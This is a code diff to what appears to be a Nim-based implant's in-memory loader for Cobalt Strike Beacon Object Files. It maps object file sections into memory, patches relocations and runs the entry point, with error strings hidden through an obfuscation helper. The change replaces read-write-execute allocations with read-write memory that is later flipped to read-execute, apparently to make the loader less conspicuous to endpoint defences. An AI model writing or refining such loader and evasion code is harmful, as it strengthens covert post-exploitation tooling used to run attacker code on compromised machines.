@@ -19,16 +19,20 @@ when defined(windows):
     LPVOID  = pointer
 
   const
-    MEM_COMMIT    = DWORD(0x1000)
-    MEM_RESERVE   = DWORD(0x2000)
-    MEM_RELEASE   = DWORD(0x8000)
-    PAGE_RWX      = DWORD(0x40)
-    TOKEN_QUERY   = DWORD(0x0008)
+    MEM_COMMIT        = DWORD(0x1000)
+    MEM_RESERVE       = DWORD(0x2000)
+    MEM_RELEASE       = DWORD(0x8000)
+    PAGE_READWRITE    = DWORD(0x04)
+    PAGE_EXECUTE_READ = DWORD(0x20)
+    TOKEN_QUERY       = DWORD(0x0008)
+    SCN_MEM_EXECUTE   = uint32(0x20000000)
 
   proc VirtualAlloc(a: LPVOID, sz: SIZE_T, tp: DWORD, prot: DWORD): LPVOID
     {.importc: "VirtualAlloc", dynlib: "kernel32".}
   proc VirtualFree(a: LPVOID, sz: SIZE_T, tp: DWORD): BOOL
     {.importc: "VirtualFree", dynlib: "kernel32".}
+  proc VirtualProtect(a: LPVOID, sz: SIZE_T, prot: DWORD, old: ptr DWORD): BOOL
+    {.importc: "VirtualProtect", dynlib: "kernel32".}
   proc LoadLibraryA(n: cstring): HANDLE
     {.importc: "LoadLibraryA", dynlib: "kernel32".}
   proc GetProcAddress(h: HANDLE, n: cstring): LPVOID
@@ -277,7 +281,7 @@ void CS_BeaconFormatInt(CS_formatp* f, int v) {
       secs[i].nReloc   = int(ru16(bof, o + 32))
       secs[i].chars    = ru32(bof, o + 36)
       let sz = max(secs[i].szRaw, 16)
-      let mem = VirtualAlloc(nil, SIZE_T(sz), MEM_COMMIT or MEM_RESERVE, PAGE_RWX)
+      let mem = VirtualAlloc(nil, SIZE_T(sz), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
       if mem == nil:
         for j in 0..<i: discard VirtualFree(secMem[j], 0, MEM_RELEASE)
         return hidstr("Error: VirtualAlloc failed")
@@ -336,6 +340,13 @@ void CS_BeaconFormatInt(CS_formatp* f, int v) {
         of REL_ADDR32, REL_ADDR32NB:
           cast[ptr uint32](patchAt)[] = uint32(cast[int](sa) and 0xFFFFFFFF'i64)
         else: discard
+
+    # Flip executable sections from RW to RX (W^X)
+    for i in 0..<nSec:
+      if secMem[i] != nil and (secs[i].chars and SCN_MEM_EXECUTE) != 0:
+        var oldProt: DWORD = 0
+        discard VirtualProtect(secMem[i], SIZE_T(max(secs[i].szRaw, 16)),
+                               PAGE_EXECUTE_READ, addr oldProt)
 
     # Find entry point
     var entryAddr: pointer = nil
